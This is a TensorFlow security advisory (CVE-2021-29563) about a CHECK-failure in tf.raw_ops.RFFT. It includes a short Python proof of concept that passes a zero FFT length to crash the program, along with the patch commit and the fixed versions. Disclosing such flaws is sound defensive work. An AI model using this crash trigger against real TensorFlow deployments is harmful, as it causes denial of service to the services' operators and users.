## TFSA-2021-051: `CHECK`-fail in `tf.raw_ops.RFFT`

### CVE Number
CVE-2021-29563

### Impact
An attacker can cause a denial of service by exploiting a `CHECK`-failure coming
from the implementation of `tf.raw_ops.RFFT`:

```python
import tensorflow as tf

inputs = tf.constant([1], shape=[1], dtype=tf.float32)
fft_length = tf.constant([0], shape=[1], dtype=tf.int32)

tf.raw_ops.RFFT(input=inputs, fft_length=fft_length)
```

The above example causes Eigen code to operate on an empty matrix. This triggers
on an assertion and causes program termination.

### Patches
We have patched the issue in GitHub commit
[31bd5026304677faa8a0b77602c6154171b9aec1](https://github.com/tensorflow/tensorflow/commit/31bd5026304677faa8a0b77602c6154171b9aec1).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
2.1.4, as these are also affected and still in supported range.
